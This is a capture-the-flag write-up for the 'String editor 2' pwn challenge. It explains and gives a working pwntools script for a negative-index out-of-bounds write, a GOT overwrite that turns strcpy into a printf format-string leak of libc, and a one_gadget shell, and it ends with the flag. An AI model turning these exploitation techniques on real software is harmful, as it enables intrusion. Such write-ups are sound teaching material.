# String editor 2

## Task

The last version was WAY too vulnerable. Who had the idea to leave debug info in? Changelog:

* removed debug info
* new sponsors who won't leak our secrets
* ui improvements
* new util tab
* you can't edit stuff other than your string anymore

And then also the important stuff:

* [string_editor_2](https://imaginaryctf.org/r/E607-string_editor_2)
* [libc.so.6](https://imaginaryctf.org/r/FBE7-libc.so.6)
* nc chal.imaginaryctf.org 42005

## Solution

This time the Sponsor is quite useless and a constant value;
The index was checked to be less than 15 (So we can't write 
higher, but we can still go out of bounds by going negative)

So the first thing I did was to overwrite strcpy at the global
offset table by a pointer to the printf thunk, so whenever we do
strcpy (so we go to the util menu and clear our string) we actually
call printf.

Then I put in `%13$p` into the actual string and then do the printf
by calling the strcpy from the utils menu. This leaks the libc
start main function pointer (return address of main). With that
we can calculate the base address of libc again, overwrite the strcpy
in the got (which was printf) to be the onegadget and do another 
strcpy which actually calls the onegadget. 

```python
libc = ELF("./libc.so.6")
io = start()

printf_thunk = p64(0x400600)

for i in range(8):
    io.recvuntil(b"utils)")
    io.sendline(str(i-104).encode()) # strcpy @ got?
    io.recvuntil(b"index?")
    io.sendline(printf_thunk[i:i+1]) # idk

for i,c in enumerate("PTR: %13$p"):
    io.recvuntil(b"utils)")
    io.sendline(str(i).encode())
    io.recvuntil(b"index?")
    io.sendline(c.encode())

io.sendline(b"15")
io.sendline(b"2")
io.recvuntil(b"PTR: ")
io.recvuntil(b"PTR: ")
ptr = int(io.recvline().split(b"*")[0],0)-libc.sym.__libc_start_main-0xf3#-213
libc.address = ptr
print(hex(ptr))

one_gadget_addr = p64(libc.address + 0xe6c81)

for i in range(8):
    io.recvuntil(b"utils)")
    io.sendline(str(i-104).encode()) # strcpy @ got?
    io.recvuntil(b"index?")
    io.sendline(one_gadget_addr[i:i+1]) # idk


io.interactive()
```

And we get the flag:

`ictf{g0t_0v3rwr1te?????????????????????????_953a20b1}`
